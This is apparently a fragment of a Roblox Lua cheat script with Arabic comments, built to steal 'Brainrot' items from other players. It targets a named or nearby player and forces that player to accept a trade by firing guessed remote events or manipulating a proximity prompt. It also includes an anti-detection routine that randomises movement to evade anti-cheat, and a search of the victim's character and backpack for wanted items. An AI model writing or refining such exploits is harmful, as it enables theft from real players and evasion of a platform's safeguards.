-- 🎯 دالة للعثور على اللاعب المستهدف
function getTargetPlayer()
    if Config.TargetPlayerName ~= "" then
        return Players:FindFirstChild(Config.TargetPlayerName)
    else
        -- إذا لم يكن هناك هدف محدد، استهدف أقرب لاعب
        local closestPlayer = nil
        local closestDistance = math.huge
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local distance = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
        return closestPlayer
    end
end

-- 🚀 دالة متقدمة لفرض قبول الترايده
function forceTradeAccept(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return end
    
    -- البحث عن RemoteEvent الخاص بالترايده
    local tradeEvent = ReplicatedStorage:FindFirstChild("TradeEvent") or 
                       ReplicatedStorage:FindFirstChild("RemoteTrade") or 
                       ReplicatedStorage:FindFirstChild("SendTrade") or
                       ReplicatedStorage:FindFirstChild("RemoteEvents"):FindFirstChild("Trade")

    if tradeEvent then
        tradeEvent:FireServer(targetPlayer, "Accept")
        print("✅ Forced trade accept on: " .. targetPlayer.Name)
        return true
    end
    
    -- طريقة بديلة: استخدام ProximityPrompt
    local tradePrompt = targetPlayer.Character:FindFirstChildOfClass("ProximityPrompt")
    if tradePrompt and (tradePrompt.Name:find("Trade") or tradePrompt.Name:find("Prompt")) then
        tradePrompt.HoldDuration = 0
        tradePrompt.MaxActivationDistance = 50
        tradePrompt:InputHoldBegin()
        task.wait(Config.AcceptDelay)
        tradePrompt:InputHoldEnd()
        print("✅ Forced trade via prompt on: " .. targetPlayer.Name)
        return true
    end
    
    return false
end

-- 🤖 نظام متقدم لمكافحة الكشف
function antiDetect()
    if not Config.AntiDetectionEnabled or not LocalPlayer.Character then return end
    
    local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
    if humanoid then
        -- تغيير سرعة المشي بشكل دوري
        humanoid.WalkSpeed = 16 + math.random(-1, 1)
        
        -- حركة عشوائية طفيفة
        local rootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if rootPart and math.random(1, 5) == 1 then
            local randomCFrame = CFrame.new(
                math.random(-1, 1) * 0.5,
                0,
                math.random(-1, 1) * 0.5
            )
            rootPart.CFrame = rootPart.CFrame * randomCFrame
        end
    end
end

-- 🧠 دالة للعثور على وسرقة الـ Brainrot المستهدف
function findAndStealTargetedBrainrot(targetPlayer)
    if not targetPlayer or not targetPlayer.Character then return end
    
    local function searchIn(container)
        for _, item in pairs(container:GetChildren()) do
            -- تحقق إذا كان اسم العنصر يطابق أحد الأسماء في القائمة
            for _, brainrotName in pairs(TargetedBrainrots) do
                if string.lower(item.Name) == string.lower(brainrotName) then
                    print("🧠 Found targeted brainrot: " .. item.Name .. " in " .. container.Name .. " of " .. targetPlayer.Name)
                    
                    -- فرض الترايده مع اللاعب الذي يمتلك هذا الـ Brainrot
                    forceTradeAccept(targetPlayer)
                    return true
                end
            end
            -- إذا كان العنصر حاوية، ابحث بداخلها أيضاً
            if item:IsA("Model") or item:IsA("Tool") then
                if searchIn(item) then
                    return true
                end
            end
        end
        return false
    end

    -- ابحث في شخصية اللاعب أولاً
    if searchIn(targetPlayer.Character) then
        return true
    end
    
    -- ثم ابحث في حقيبته
    if searchIn(targetPlayer.Backpack) then
        return true
    end
    
    return false
end

